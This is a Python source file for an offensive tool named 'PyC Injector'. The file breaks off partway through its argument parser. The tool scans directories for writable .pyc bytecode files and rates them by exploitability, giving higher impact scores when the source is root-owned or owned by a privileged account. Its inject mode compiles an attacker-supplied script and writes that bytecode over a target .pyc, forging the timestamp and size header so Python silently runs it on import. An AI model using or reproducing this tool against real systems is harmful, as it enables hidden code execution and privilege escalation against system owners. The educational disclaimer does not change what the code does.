#!/usr/bin/env python3
"""
PyC Stomper - A tool for scanning and injecting malicious bytecode into .pyc files

This tool demonstrates the security vulnerability in Python's timestamp-based
.pyc validation mechanism.

WARNING: This tool is for educational and security research purposes only.
Unauthorized use of this tool to modify systems you don't own is illegal.

Usage:
    python pyc_injector.py scan <directory> [--verbose] [--csv output.csv]
    python pyc_injector.py inject <target_pyc> <malicious_py> [--backup]
"""

import os
import sys
import struct
import argparse
import py_compile
import tempfile
import shutil
import csv
import platform
from pathlib import Path
from typing import List, Tuple, Optional

# Platform detection
IS_WINDOWS = platform.system() == 'Windows'
IS_UNIX = not IS_WINDOWS
DEBUG_MODE = False  # Set by command-line argument

# Import platform-specific modules
if IS_WINDOWS:
    try:
        import win32security
        import win32api
        import win32con
        import ntsecuritycon
        HAS_WIN32 = True
    except ImportError:
        HAS_WIN32 = False
        print("Warning: pywin32 not installed. Limited functionality on Windows.", file=sys.stderr)
        print("Install with: pip install pywin32", file=sys.stderr)
else:
    import pwd
    import grp


class Color:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'


def print_banner():
    """Print tool banner"""
    platform_info = f"{platform.system()} {platform.release()}"
    pywin32_status = ""
    if IS_WINDOWS:
        pywin32_status = f" | pywin32: {'✓' if HAS_WIN32 else '✗ (limited)'}"
    
    banner = f"""
{Color.CYAN}{Color.BOLD}
╔═══════════════════════════════════════════════════════════════════════╗
║                          PyC Injector v2.1                            ║
║         Python Bytecode Injection & Analysis Tool (Cross-Platform)    ║
╚═══════════════════════════════════════════════════════════════════════╝
{Color.RESET}
{Color.BLUE}Platform: {platform_info}{pywin32_status}{Color.RESET}
{Color.YELLOW}⚠️  WARNING: For educational and authorized security research only!{Color.RESET}
"""
    print(banner)


def read_pyc_header(pyc_path: str) -> dict:
    """
    Read .pyc file header with full PEP 552 support
    
    Returns: dict with magic, flags, validation_mode, timestamp/hash, filesize
    """
    try:
        with open(pyc_path, 'rb') as f:
            magic = f.read(4)
            flags = struct.unpack('<I', f.read(4))[0]
            
            # PEP 552: Flags determine validation mode
            # Bit 0: 0 = timestamp-based, 1 = hash-based
            # Bit 1: (for hash-based) 0 = unchecked, 1 = checked
            is_hash_based = bool(flags & 0b01)
            
            if is_hash_based:
                # Hash-based: bytes 8-15 contain 64-bit SipHash
                hash_bytes = f.read(8)
                siphash = struct.unpack('<Q', hash_bytes)[0]
                
                return {
                    'magic': magic,
                    'flags': flags,
                    'validation_mode': 'hash-based',
                    'hash': siphash,
                    'hash_hex': hash_bytes.hex(),
                    'check_source': bool(flags & 0b10),
                }
            else:
                # Timestamp-based: bytes 8-11 timestamp, 12-15 size
                timestamp = struct.unpack('<I', f.read(4))[0]
                filesize = struct.unpack('<I', f.read(4))[0]
                
                return {
                    'magic': magic,
                    'flags': flags,
                    'validation_mode': 'timestamp-based',
                    'timestamp': timestamp,
                    'filesize': filesize,
                }
    except Exception as e:
        raise ValueError(f"Failed to read .pyc header: {e}")


def read_pyc_bytecode(pyc_path: str) -> bytes:
    """Read the bytecode portion (after 16-byte header)"""
    try:
        with open(pyc_path, 'rb') as f:
            f.read(16)  # Skip header
            return f.read()
    except Exception as e:
        raise ValueError(f"Failed to read .pyc bytecode: {e}")


def write_spoofed_pyc(bytecode: bytes, output_path: str, 
                      source_timestamp: int, source_size: int, 
                      magic: bytes, flags: int) -> None:
    """
    Write a spoofed .pyc file with modified header
    
    Args:
        bytecode: The malicious bytecode to inject
        output_path: Path to write the spoofed .pyc
        source_timestamp: Target source file's timestamp
        source_size: Target source file's size
        magic: Python version magic number
        flags: PEP 552 flags
    """
    try:
        with open(output_path, 'wb') as f:
            f.write(magic)
            f.write(struct.pack('<I', flags))
            f.write(struct.pack('<I', source_timestamp))
            f.write(struct.pack('<I', source_size))
            f.write(bytecode)
    except Exception as e:
        raise ValueError(f"Failed to write spoofed .pyc: {e}")


def debug_print(message: str) -> None:
    """Print debug message if debug mode is enabled"""
    if DEBUG_MODE:
        print(f"{Color.MAGENTA}[DEBUG] {message}{Color.RESET}")


def is_process_elevated() -> bool:
    """
    Check if the current process is running with elevated privileges (Windows UAC)
    
    Returns: True if elevated, False if not elevated or unable to determine
    """
    if not IS_WINDOWS or not HAS_WIN32:
        return True  # Assume elevated on non-Windows or without pywin32
    
    try:
        token_handle = win32security.OpenProcessToken(  # type: ignore
            win32api.GetCurrentProcess(),  # type: ignore
            win32con.TOKEN_QUERY  # type: ignore
        )
        
        # Check if token is elevated
        is_elevated = win32security.GetTokenInformation(  # type: ignore
            token_handle,
            win32security.TokenElevation  # type: ignore
        )
        
        debug_print(f"Process elevated: {bool(is_elevated)}")
        return bool(is_elevated)
    except Exception as e:
        debug_print(f"Could not determine elevation status: {e}")
        return True  # Assume elevated if we can't determine


def is_writable(path: str) -> bool:
    """
    Check if a file is writable by current user (cross-platform)
    
    On Windows: Uses proper AccessCheck API if pywin32 is available, otherwise os.access
    On Unix: Uses os.access which checks standard file permissions
    """
    debug_print(f"Checking write access for: {path}")
    
    if IS_WINDOWS and HAS_WIN32:
        try:
            # Method 1: Try using Windows AccessCheck API for accurate permission checking
            # This properly handles group memberships, inheritance, and ACL order
            try:
                debug_print("Attempting AccessCheck API method...")
                
                # Get current process token
                token_handle = win32security.OpenProcessToken(  # type: ignore
                    win32api.GetCurrentProcess(),  # type: ignore
                    win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY  # type: ignore
                )
                
                # Duplicate token for impersonation
                impersonation_token = win32security.DuplicateToken(  # type: ignore
                    token_handle,
                    win32security.SecurityImpersonation  # type: ignore
                )
                
                # Get file security descriptor
                sd = win32security.GetFileSecurity(  # type: ignore
                    path,
                    win32security.OWNER_SECURITY_INFORMATION |  # type: ignore
                    win32security.GROUP_SECURITY_INFORMATION |  # type: ignore
                    win32security.DACL_SECURITY_INFORMATION  # type: ignore
                )
                
                # Create generic mapping for file objects
                mapping = {
                    'GenericRead': ntsecuritycon.FILE_GENERIC_READ,  # type: ignore
                    'GenericWrite': ntsecuritycon.FILE_GENERIC_WRITE,  # type: ignore
                    'GenericExecute': ntsecuritycon.FILE_GENERIC_EXECUTE,  # type: ignore
                    'GenericAll': ntsecuritycon.FILE_ALL_ACCESS  # type: ignore
                }
                
                # Check for FILE_WRITE_DATA access
                desired_access = ntsecuritycon.FILE_WRITE_DATA  # type: ignore
                
                # Perform access check
                granted_access = win32security.AccessCheck(  # type: ignore
                    sd,
                    impersonation_token,
                    desired_access,
                    mapping
                )
                
                # granted_access is a tuple: (access_granted, granted_access_mask)
                result = granted_access[0] != 0
                debug_print(f"AccessCheck result: {result}")
                return result
                
            except AttributeError:
                # AccessCheck not available in this pywin32 version
                debug_print("AccessCheck not available, falling back to manual ACL check")
                pass
            
            # Method 2: Manual ACL checking with group membership
            debug_print("Using manual ACL check with group membership...")
            
            # Get current user's SID and groups
            token_handle = win32security.OpenProcessToken(  # type: ignore
                win32api.GetCurrentProcess(),  # type: ignore
                win32con.TOKEN_QUERY  # type: ignore
            )
            
            user_info = win32security.GetTokenInformation(  # type: ignore
                token_handle,
                win32security.TokenUser  # type: ignore
            )
            user_sid = user_info[0]
            debug_print(f"Current user SID: {user_sid}")
            
            # Get user's group memberships
            groups_info = win32security.GetTokenInformation(  # type: ignore
                token_handle,
                win32security.TokenGroups  # type: ignore
            )
            group_sids = [group[0] for group in groups_info]
            debug_print(f"User belongs to {len(group_sids)} groups")
            
            # All SIDs to check (user + all groups)
            all_sids = [user_sid] + group_sids
            
            # Get file security descriptor
            sd = win32security.GetFileSecurity(  # type: ignore
                path,
                win32security.DACL_SECURITY_INFORMATION  # type: ignore
            )
            
            # Get DACL
            dacl = sd.GetSecurityDescriptorDacl()
            if dacl is None:
                # No DACL means full access
                debug_print("No DACL found - full access granted")
                return True
            
            debug_print(f"Found {dacl.GetAceCount()} ACEs in DACL")
            
            # Process ACEs in order - check denials first, then allows
            has_write_allow = False
            has_write_deny = False
            
            for i in range(dacl.GetAceCount()):
                ace = dacl.GetAce(i)
                ace_type = ace[0][0]
                ace_perms = ace[1]
                ace_sid = ace[2]
                
                # Check if this ACE applies to user or any of their groups
                if ace_sid in all_sids:
                    if ace_type == win32security.ACCESS_DENIED_ACE_TYPE:  # type: ignore
                        if ace_perms & ntsecuritycon.FILE_WRITE_DATA:  # type: ignore
                            debug_print(f"Found DENY ACE for FILE_WRITE_DATA")
                            has_write_deny = True
                    elif ace_type == win32security.ACCESS_ALLOWED_ACE_TYPE:  # type: ignore
                        if ace_perms & ntsecuritycon.FILE_WRITE_DATA:  # type: ignore
                            debug_print(f"Found ALLOW ACE for FILE_WRITE_DATA")
                            has_write_allow = True
            
            # Deny takes precedence over allow
            if has_write_deny:
                debug_print("Result: NOT WRITABLE (explicit deny)")
                return False
            if has_write_allow:
                debug_print("Result: WRITABLE (has allow ACE)")
                return True
            
            # No explicit allow or deny, fall back to os.access
            debug_print("No explicit allow/deny found, using os.access")
            result = os.access(path, os.W_OK)
            debug_print(f"os.access result: {result}")
            return result
            
        except Exception as e:
            # Fall back to simple check if everything fails
            debug_print(f"Exception in Windows permission check: {e}, falling back to os.access")
            return os.access(path, os.W_OK)
    else:
        # Unix or Windows without pywin32
        result = os.access(path, os.W_OK)
        debug_print(f"Unix/simple check result: {result}")
        return result


def requires_elevation_to_write(path: str) -> bool:
    """
    Check if UAC elevation is required to write to a file (Windows only)
    
    This checks if the file is writable according to ACLs but the current
    process is running with a filtered (non-elevated) token.
    
    Returns: True if elevation needed, False otherwise
    """
    if not IS_WINDOWS or not HAS_WIN32:
        return False  # No UAC on non-Windows
    
    # If we're already elevated, no additional elevation needed
    if is_process_elevated():
        debug_print("Process is elevated, no additional elevation needed")
        return False
    
    # Check if the file would be writable with elevation
    if not is_writable(path):
        debug_print("File is not writable even with elevation")
        return False
    
    # File is writable according to ACLs, check if we can actually write now
    try:
        with open(path, 'ab') as f:
            pass
        debug_print("File is writable without elevation")
        return False
    except (IOError, OSError, PermissionError):
        debug_print("File requires elevation to write")
        return True


def get_file_owner(path: str) -> Tuple[str, Optional[int]]:
    """
    Get file owner information (cross-platform)
    
    Returns: (owner_name, owner_id)
    On Windows: owner_id is None (SIDs are not comparable to UIDs)
    On Unix: owner_id is the UID
    """
    if IS_WINDOWS and HAS_WIN32:
        try:
            # Get security descriptor
            sd = win32security.GetFileSecurity(path, win32security.OWNER_SECURITY_INFORMATION)  # type: ignore
            owner_sid = sd.GetSecurityDescriptorOwner()
            
            # Convert SID to account name
            name, domain, _ = win32security.LookupAccountSid(None, owner_sid)  # type: ignore
            if domain:
                return (f"{domain}\\{name}", None)
            return (name, None)
        except Exception as e:
            return ("UNKNOWN", None)
    else:
        # Unix
        try:
            stat_info = os.stat(path)
            uid = stat_info.st_uid
            try:
                owner_name = pwd.getpwuid(uid).pw_name  # type: ignore
            except KeyError:
                owner_name = str(uid)
            return (owner_name, uid)
        except Exception:
            return ("UNKNOWN", None)


def get_current_user() -> Tuple[str, Optional[int]]:
    """
    Get current user information (cross-platform)
    
    Returns: (username, user_id)
    On Windows: user_id is None
    On Unix: user_id is the UID
    """
    if IS_WINDOWS:
        try:
            import getpass
            return (getpass.getuser(), None)
        except Exception:
            return ("UNKNOWN", None)
    else:
        # Unix
        try:
            uid = os.getuid()  # type: ignore
            try:
                username = pwd.getpwuid(uid).pw_name  # type: ignore
            except KeyError:
                username = str(uid)
            return (username, uid)
        except Exception:
            return ("UNKNOWN", None)


def is_elevated_user(owner_name: str, owner_id: Optional[int]) -> bool:
    """
    Check if user is elevated/privileged (cross-platform)
    
    On Windows: Checks for SYSTEM, Administrator, or TrustedInstaller
    On Unix: Checks if UID is 0 (root)
    """
    if IS_WINDOWS:
        # Check for common privileged Windows accounts
        privileged_accounts = ['SYSTEM', 'NT AUTHORITY\\SYSTEM', 'Administrator', 
                               'TrustedInstaller', 'Administrators']
        return any(priv.lower() in owner_name.lower() for priv in privileged_accounts)
    else:
        # Unix: root is UID 0
        return owner_id == 0


def find_source_file(pyc_path: str) -> Optional[str]:
    """
    Find the corresponding .py source file for a .pyc file
    
    Returns: Path to .py file if found, None otherwise
    """
    # Method 1: Try to reconstruct path from __pycache__
    if '__pycache__' in pyc_path:
        # Convert: dir/__pycache__/module.cpython-311.pyc -> dir/module.py
        parent_dir = os.path.dirname(os.path.dirname(pyc_path))
        basename = os.path.basename(pyc_path)
        # Remove .cpython-XYZ.pyc suffix
        module_name = basename.split('.')[0]
        potential_py = os.path.join(parent_dir, module_name + '.py')
        if os.path.exists(potential_py):
            return potential_py
    
    # Method 2: Look in same directory
    potential_py = pyc_path.rsplit('.', 1)[0] + '.py'
    if os.path.exists(potential_py):
        return potential_py
    
    # Method 3: Look in parent directory
    parent_dir = os.path.dirname(os.path.dirname(pyc_path))
    basename = os.path.basename(pyc_path).split('.')[0]
    potential_py = os.path.join(parent_dir, basename + '.py')
    if os.path.exists(potential_py):
        return potential_py
    
    return None


def find_pyc_files(root_dir: str, verbose: bool = False) -> List[Tuple[str, bool]]:
    """
    Recursively find all .pyc files in directory
    
    Returns: List of (path, is_writable) tuples
    """
    pyc_files = []
    root_path = Path(root_dir).resolve()
    
    if verbose:
        print(f"{Color.BLUE}[*] Scanning directory: {root_path}{Color.RESET}")
    
    try:
        for root, dirs, files in os.walk(root_path):
            # Skip certain directories for performance
            dirs[:] = [d for d in dirs if d not in ['.git', '.svn', 'node_modules', '.venv', 'venv']]
            
            for file in files:
                if file.endswith('.pyc'):
                    full_path = os.path.join(root, file)
                    writable = is_writable(full_path)
                    pyc_files.append((full_path, writable))
                    
                    if verbose:
                        status = f"{Color.GREEN}WRITABLE{Color.RESET}" if writable else f"{Color.RED}READ-ONLY{Color.RESET}"
                        print(f"  [{'W' if writable else 'R'}] {full_path} - {status}")
    
    except PermissionError as e:
        if verbose:
            print(f"{Color.YELLOW}[!] Permission denied: {e}{Color.RESET}")
    
    return pyc_files


def calculate_risk_score(pyc_path: str, header: dict) -> Tuple[int, str, str]:
    """
    Calculate risk score for a .pyc file based on exploitability and impact (cross-platform)
    
    Returns: (score, exploitability, impact_description)
    Higher score = more dangerous
    """
    score = 0
    exploitability = "UNKNOWN"
    impact = "UNKNOWN"
    
    # Check if .pyc is writable
    if not is_writable(pyc_path):
        return (0, "NOT EXPLOITABLE", "Read-only file")
    
    # Check if UAC elevation is required (Windows only)
    needs_elevation = requires_elevation_to_write(pyc_path)
    
    # Find source file
    py_path = find_source_file(pyc_path)
    
    # Validation method score
    if header['validation_mode'] == 'timestamp-based':
        score += 50  # Timestamp is easily exploitable
        exploitability = "TRIVIAL" if not needs_elevation else "EASY"
    elif header['validation_mode'] == 'hash-based':
        if header.get('check_source'):
            score += 20  # Checked hash, harder
            exploitability = "MODERATE" if not needs_elevation else "DIFFICULT"
        else:
            score += 35  # Unchecked hash, easier
            exploitability = "EASY" if not needs_elevation else "MODERATE"
    
    # Reduce score if elevation is required
    if needs_elevation:
        score -= 20  # Requiring UAC prompt makes it less trivial
    
    # Source file impact scoring (cross-platform)
    if py_path and os.path.exists(py_path):
        try:
            # Get owner info for both files
            pyc_owner_name, pyc_owner_id = get_file_owner(pyc_path)
            py_owner_name, py_owner_id = get_file_owner(py_path)
            current_user_name, current_user_id = get_current_user()
            
            # Check if source is owned by different user
            if IS_WINDOWS:
                # On Windows, compare names (case-insensitive)
                different_owner = py_owner_name.lower() != current_user_name.lower()
            else:
                # On Unix, compare UIDs
                different_owner = py_owner_id != current_user_id
            
            if different_owner:
                score += 30
                # Check if it's elevated/privileged user
                if is_elevated_user(py_owner_name, py_owner_id):
                    if IS_WINDOWS:
                        impact = "CRITICAL (privileged account)"
                    else:
                        impact = "CRITICAL (root-owned)"
                    score += 20
                else:
                    impact = "HIGH (other user)"
            elif is_elevated_user(py_owner_name, py_owner_id):
                if IS_WINDOWS:
                    impact = "CRITICAL (privileged account)"
                else:
                    impact = "CRITICAL (root-owned)"
                score += 50
            else:
                impact = "MEDIUM (same user)"
            
            # Bonus: source is not writable but .pyc is
            if not is_writable(py_path):
                score += 15
                if "CRITICAL" in impact:
                    impact += ", read-only source"
                else:
                    impact += " (read-only source)"
                    
        except Exception:
            impact = "MEDIUM"
    else:
        # No source file - .pyc runs without validation
        score += 40
        if needs_elevation:
            impact = "HIGH (no source validation, requires elevation)"
            exploitability = "EASY"  # Downgrade from TRIVIAL
        else:
            impact = "HIGH (no source validation)"
            exploitability = "TRIVIAL"
    
    return (score, exploitability, impact)


def print_table_row(cols, widths, separator='│'):
    """Print a table row with proper spacing."""
    row = separator
    for col, width in zip(cols, widths):
        # Strip ANSI codes for length calculation
        import re
        clean_col = re.sub(r'\033\[[0-9;]+m', '', str(col))
        padding = width - len(clean_col)
        row += f" {col}{' ' * padding} {separator}"
    print(row)


def print_table_separator(widths, left='├', mid='┼', right='┤', line='─'):
    """Print a table separator line."""
    parts = [line * (w + 2) for w in widths]
    print(f"{left}{mid.join(parts)}{right}")


def scan_mode(directory: str, verbose: bool = False, csv_file: Optional[str] = None, debug: bool = False) -> None:
    """
    Scan mode: Find all .pyc files and identify writable ones
    """
    global DEBUG_MODE
    DEBUG_MODE = debug
    
    print(f"\n{Color.BOLD}[SCAN MODE]{Color.RESET}")
    print(f"{Color.CYAN}{'='*80}{Color.RESET}")
    
    if debug:
        print(f"{Color.MAGENTA}[DEBUG MODE ENABLED]{Color.RESET}\n")
    
    if not os.path.exists(directory):
        print(f"{Color.RED}[!] Error: Directory not found: {directory}{Color.RESET}")
        return
    
    if not os.path.isdir(directory):
        print(f"{Color.RED}[!] Error: Not a directory: {directory}{Color.RESET}")
        return
    
    pyc_files = find_pyc_files(directory, verbose)
    
    if not pyc_files:
        print(f"\n{Color.YELLOW}[!] No .pyc files found in {directory}{Color.RESET}")
        return
    
    writable_files = [f for f, w in pyc_files if w]
    readonly_files = [f for f, w in pyc_files if not w]
    
    # Summary
    print(f"\n{Color.BOLD}[SCAN RESULTS]{Color.RESET}")
    print(f"{Color.CYAN}{'='*80}{Color.RESET}")
    print(f"Total .pyc files found: {Color.BOLD}{len(pyc_files)}{Color.RESET}")
    print(f"Writable files: {Color.GREEN}{Color.BOLD}{len(writable_files)}{Color.RESET}")
    print(f"Read-only files: {Color.RED}{len(readonly_files)}{Color.RESET}")
    
    if writable_files:
        # Analyze all files and calculate risk scores
        file_analysis = []
        
        for path in writable_files:
            try:
                stat_info = os.stat(path)
                header = read_pyc_header(path)
                py_path = find_source_file(path)
                
                # Calculate risk
                risk_score, exploitability, impact = calculate_risk_score(path, header)
                
                # Get owner info (cross-platform)
                pyc_owner_name, _ = get_file_owner(path)
                
                # Get source owner if exists
                source_owner = "N/A"
                if py_path and os.path.exists(py_path):
                    source_owner_name, _ = get_file_owner(py_path)
                    source_owner = source_owner_name
                
                file_analysis.append({
                    'path': path,
                    'pyc_owner': pyc_owner_name,
                    'source_path': py_path if py_path else "NOT FOUND",
                    'source_owner': source_owner,
                    'validation': header['validation_mode'],
                    'exploitability': exploitability,
                    'impact': impact,
                    'risk_score': risk_score,
                    'header': header,
                    'stat': stat_info
                })
                
            except Exception as e:
                if verbose:
                    print(f"{Color.YELLOW}[!] Error analyzing {path}: {e}{Color.RESET}")
        
        # Sort by risk score (highest first)
        file_analysis.sort(key=lambda x: x['risk_score'], reverse=True)
        
        # Print ASCII table
        print(f"\n{Color.BOLD}[EXPLOITABILITY ANALYSIS - ORDERED BY RISK]{Color.RESET}")
        print(f"{Color.YELLOW}⚠️  Higher risk scores indicate easier exploitation with greater impact{Color.RESET}\n")
        
        # Table column widths (wider for full paths)
        widths = [4, 12, 15, 12, 12, 50, 50]
        
        # Print table header
        print("┌" + "┬".join(["─" * (w + 2) for w in widths]) + "┐")
        
        headers = [
            f"{Color.BOLD}Risk{Color.RESET}",
            f"{Color.BOLD}Exploit{Color.RESET}",
            f"{Color.BOLD}Validation{Color.RESET}",
            f"{Color.BOLD}Src Owner{Color.RESET}",
            f"{Color.BOLD}.pyc Owner{Color.RESET}",
            f"{Color.BOLD}.pyc Path{Color.RESET}",
            f"{Color.BOLD}Source Path{Color.RESET}"
        ]
        print_table_row(headers, widths)
        
        print_table_separator(widths, '├', '┼', '┤')
        
        # Print each file
        for item in file_analysis:
            # Colorize risk score
            risk = item['risk_score']
            if risk >= 80:
                risk_color = Color.RED
            elif risk >= 50:
                risk_color = Color.YELLOW
            else:
                risk_color = Color.GREEN
            
            # Colorize exploitability
            exploit = item['exploitability']
            if exploit == "TRIVIAL":
                exploit_color = Color.RED
            elif exploit == "EASY":
                exploit_color = Color.YELLOW
            elif exploit == "MODERATE":
                exploit_color = Color.CYAN
            else:
                exploit_color = Color.GREEN
            
            # Colorize validation
            val = item['validation'][:9]  # Truncate
            if "timestamp" in item['validation']:
                val_color = Color.RED
            else:
                val_color = Color.CYAN
            
            cols = [
                f"{risk_color}{risk}{Color.RESET}",
                f"{exploit_color}{exploit}{Color.RESET}",
                f"{val_color}{val}{Color.RESET}",
                item['source_owner'],
                item['pyc_owner'],
                item['path'],  # Full path, no truncation
                item['source_path']  # Full source path, no truncation
            ]
            
            print_table_row(cols, widths)
        
        print("└" + "┴".join(["─" * (w + 2) for w in widths]) + "┘")
        
        # Export to CSV if requested
        if csv_file:
            try:
                with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    # Write header
                    writer.writerow([
                        'Risk Score',
                        'Exploitability',
                        'Validation Method',
                        'Source Owner',
                        '.pyc Owner',
                        '.pyc Path',
                        'Source Path'
                    ])
                    # Write data rows
                    for item in file_analysis:
                        writer.writerow([
                            item['risk_score'],
                            item['exploitability'],
                            item['validation'],
                            item['source_owner'],
                            item['pyc_owner'],
                            item['path'],
                            item['source_path']
                        ])
                print(f"\n{Color.GREEN}[+] Results exported to: {csv_file}{Color.RESET}")
            except Exception as e:
                print(f"\n{Color.RED}[!] Error exporting CSV: {e}{Color.RESET}")
        
        # Print legend
        print(f"\n{Color.BOLD}[LEGEND]{Color.RESET}")
        print(f"  {Color.RED}Risk Score:{Color.RESET}")
        print(f"    {Color.RED}80+{Color.RESET} = CRITICAL (immediate threat)")
        print(f"    {Color.YELLOW}50-79{Color.RESET} = HIGH (easily exploitable)")
        print(f"    {Color.GREEN}<50{Color.RESET} = MEDIUM (requires more effort)")
        print(f"\n  {Color.RED}Exploitability:{Color.RESET}")
        print(f"    {Color.RED}TRIVIAL{Color.RESET} = Can be exploited with basic tools")
        print(f"    {Color.YELLOW}EASY{Color.RESET} = Straightforward exploitation")
        print(f"    {Color.CYAN}MODERATE{Color.RESET} = Requires additional work")
        
        # Detailed view for high-risk files
        critical_files = [f for f in file_analysis if f['risk_score'] >= 80]
        if critical_files:
            print(f"\n{Color.BOLD}{Color.RED}[CRITICAL RISK FILES - DETAILED ANALYSIS]{Color.RESET}")
            print(f"{Color.RED}🚨 These files pose the highest security risk!{Color.RESET}\n")
            
            for item in critical_files:
                print(f"{Color.CYAN}{'─'*80}{Color.RESET}")
                print(f"{Color.RED}{Color.BOLD}RISK SCORE: {item['risk_score']}{Color.RESET}")
                print(f"File: {item['path']}")
                print(f"Exploitability: {Color.RED}{item['exploitability']}{Color.RESET}")
                print(f"Impact: {Color.RED}{item['impact']}{Color.RESET}")
                print(f"Validation: {item['validation']}")
                print(f"Source: {item['source_path']}")
                print(f"Source Owner: {Color.YELLOW}{item['source_owner']}{Color.RESET}")
                print(f".pyc Owner: {item['pyc_owner']}")
                print()
    
    # Also show read-only files if verbose
    if readonly_files and verbose:
        print(f"\n{Color.BOLD}[READ-ONLY .PYC FILES]{Color.RESET}")
        print(f"{Color.BLUE}ℹ️  These files cannot be modified without elevated privileges{Color.RESET}\n")
        for i, path in enumerate(readonly_files, 1):
            print(f"{Color.RED}[{i}]{Color.RESET} {path}")
            try:
                py_path = find_source_file(path)
                if py_path:
                    print(f"    Source: {py_path}")
            except:
                pass
        print()


def inject_mode(target_pyc: str, malicious_py: str, backup: bool = False) -> None:
    """
    Inject mode: Replace target .pyc with malicious bytecode
    """
    print(f"\n{Color.BOLD}[INJECT MODE]{Color.RESET}")
    print(f"{Color.CYAN}{'='*75}{Color.RESET}")
    
    # Validate inputs
    if not os.path.exists(target_pyc):
        print(f"{Color.RED}[!] Error: Target .pyc not found: {target_pyc}{Color.RESET}")
        return
    
    if not os.path.exists(malicious_py):
        print(f"{Color.RED}[!] Error: Malicious .py not found: {malicious_py}{Color.RESET}")
        return
    
    if not target_pyc.endswith('.pyc'):
        print(f"{Color.RED}[!] Error: Target must be a .pyc file{Color.RESET}")
        return
    
    if not malicious_py.endswith('.py'):
        print(f"{Color.RED}[!] Error: Malicious file must be a .py file{Color.RESET}")
        return
    
    if not is_writable(target_pyc):
        print(f"{Color.RED}[!] Error: Target .pyc is not writable{Color.RESET}")
        return
    
    # Find corresponding source file for target
    print(f"\n{Color.BLUE}[*] Analyzing target .pyc file...{Color.RESET}")
    
    # Use helper function to find source
    target_py = find_source_file(target_pyc)
    
    if not target_py:
        print(f"{Color.YELLOW}[!] Warning: Could not find corresponding .py source file{Color.RESET}")
        print(f"{Color.YELLOW}[!] Injection will work if source is absent, but will fail if it exists{Color.RESET}")
        response = input(f"{Color.YELLOW}Continue anyway? (y/N): {Color.RESET}")
        if response.lower() != 'y':
            print(f"{Color.RED}[!] Aborted{Color.RESET}")
            return
        target_timestamp = int(os.path.getmtime(target_pyc))
        target_size = os.path.getsize(target_pyc)
    else:
        print(f"{Color.GREEN}[+] Found source file: {target_py}{Color.RESET}")
        target_stat = os.stat(target_py)
        target_timestamp = int(target_stat.st_mtime)
        target_size = target_stat.st_size
    
    # Read target .pyc header
    try:
        header = read_pyc_header(target_pyc)
        print(f"{Color.GREEN}[+] Target .pyc header:{Color.RESET}")
        print(f"    Magic: {header['magic'].hex()}")
        print(f"    Validation mode: {header['validation_mode']}")
        
        if header['validation_mode'] == 'hash-based':
            print(f"{Color.RED}[!] Error: Target uses hash-based validation{Color.RESET}")
            print(f"{Color.RED}[!] Hash-based .pyc injection requires computing valid SipHash{Color.RESET}")
            print(f"{Color.RED}[!] This feature is not yet implemented{Color.RESET}")
            return
        
        print(f"    Original timestamp: {header['timestamp']}")
        print(f"    Original size: {header['filesize']}")
        target_magic = header['magic']
        target_flags = header['flags']
    except Exception as e:
        print(f"{Color.RED}[!] Error reading target .pyc: {e}{Color.RESET}")
        return
    
    # Compile malicious .py to bytecode
    print(f"\n{Color.BLUE}[*] Compiling malicious Python script...{Color.RESET}")
    
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            temp_pyc = os.path.join(tmpdir, 'temp.pyc')
            py_compile.compile(malicious_py, temp_pyc, doraise=True)
            
            # Read malicious bytecode
            malicious_bytecode = read_pyc_bytecode(temp_pyc)
            
            print(f"{Color.GREEN}[+] Compiled successfully{Color.RESET}")
            print(f"    Bytecode size: {len(malicious_bytecode)} bytes")
    except Exception as e:
        print(f"{Color.RED}[!] Error compiling malicious script: {e}{Color.RESET}")
        return
    
    # Create spoofed .pyc
    print(f"\n{Color.BLUE}[*] Creating spoofed .pyc with modified header...{Color.RESET}")
    print(f"    Target timestamp: {target_timestamp}")
    print(f"    Target size: {target_size}")
    
    # Backup if requested
    if backup:
        backup_path = target_pyc + '.backup'
        shutil.copy2(target_pyc, backup_path)
        print(f"{Color.GREEN}[+] Backup created: {backup_path}{Color.RESET}")
    
    # Write spoofed .pyc
    try:
        write_spoofed_pyc(malicious_bytecode, target_pyc, target_timestamp, 
                         target_size, target_magic, target_flags)
        print(f"{Color.GREEN}{Color.BOLD}[+] INJECTION SUCCESSFUL!{Color.RESET}")
        print(f"{Color.GREEN}[+] Replaced: {target_pyc}{Color.RESET}")
        
        # Verify
        new_header = read_pyc_header(target_pyc)
        print(f"\n{Color.BLUE}[*] Verification:{Color.RESET}")
        print(f"    New timestamp: {new_header['timestamp']} (matches target: {new_header['timestamp'] == target_timestamp})")
        print(f"    New size: {new_header['filesize']} (matches target: {new_header['filesize'] == target_size})")
        
        if target_py:
            print(f"\n{Color.YELLOW}[!] The malicious bytecode will be executed when Python imports this module{Color.RESET}")
            print(f"{Color.YELLOW}[!] Python will trust the .pyc because the header matches {os.path.basename(target_py)}{Color.RESET}")
        
    except Exception as e:
        print(f"{Color.RED}[!] Error writing spoofed .pyc: {e}{Color.RESET}")
        return


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='PyC Injector - Python Bytecode Injection Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan current directory for writable .pyc files
  %(prog)s scan . --verbose
  
  # Scan and export results to CSV
  %(prog)s scan /usr/lib/python3.11 --csv results.csv
  
  # Inject malicious bytecode into target .pyc
  %(prog)s inject __pycache__/target.cpython-311.pyc malicious.py --backup
  
WARNING: This tool is for educational and authorized security research only.
        """
    )
    
    subparsers = parser.add_subparsers(dest='mode', help='Operation mode')
    
    # Scan mode
    scan_parser = subparsers.add_parser('scan', help='Scan for writable .pyc files')
    scan_parser.add_argument('directory', help='Directory to scan')
    scan_parser.add_argument('-v', '--verbose', action='store_true', 
                           help='Verbose output (show all files found)')
    scan_parser.add_argument('-d', '--debug', action='store_true',
                           help='Debug mode (show detailed permission checks on Windows)')
    scan_parser.add_argument('-c', '--csv', type=str, metavar='FILE',
                           help='Export results to CSV file')
    
    # Inject mode
    inject_parser = subparsers.add_parser('inject', help='Inject malicious bytecode')
    inject_parser.add_argument('target_pyc', help='Target .pyc file to replace')
    inject_parser.add_argument('malicious_py', help='Python script to inject')
